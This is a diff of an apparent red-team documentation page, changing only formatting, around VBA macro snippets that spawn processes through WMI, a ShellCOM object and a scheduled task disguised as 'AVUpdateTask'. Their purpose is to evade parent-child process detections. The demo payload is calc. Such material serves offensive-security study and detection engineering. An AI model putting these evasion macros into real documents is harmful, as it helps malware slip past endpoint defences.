@@ -8,8 +8,7 @@ Below are some techniques showing how those type of detections could be bypassed
 
 ## Spawning via WmiPrvse.exe using wmi
 
-{% tabs %}
-{% tab title="macro.vba" %}
+{% code title="macro.vba" %}
 ```javascript
 Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
 Set objStartup = objWMIService.Get("Win32_ProcessStartup")
@@ -17,21 +16,18 @@ Set objConfig = objStartup.SpawnInstance_
 Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
 errReturn = objProcess.Create("calc", Null, objConfig, intProcessID)
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../../.gitbook/assets/screenshot-from-2019-04-10-22-11-41.png)
 
 ## Spawning via ShellCOM
 
-{% tabs %}
-{% tab title="macro.vba" %}
+{% code title="macro.vba" %}
 ```csharp
 Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
 obj.Document.Application.ShellExecute "calc",Null,"C:\\Windows\\System32",Null,0
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ## Spawning via svchost.exe using XMLDOM
 
@@ -67,8 +63,7 @@ version="1.0">
 
 ## Spawning via svchost.exe using Scheduled Task
 
-{% tabs %}
-{% tab title="macro.vba" %}
+{% code title="macro.vba" %}
 ```csharp
 Set service = CreateObject("Schedule.Service")
 Call service.Connect
@@ -87,8 +82,7 @@ Action.Path = "C:\Windows\System32\cmd.exe"
 'Action.Arguments = "/c whoami"
 Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../../.gitbook/assets/screenshot-from-2019-04-10-22-19-03.png)
 
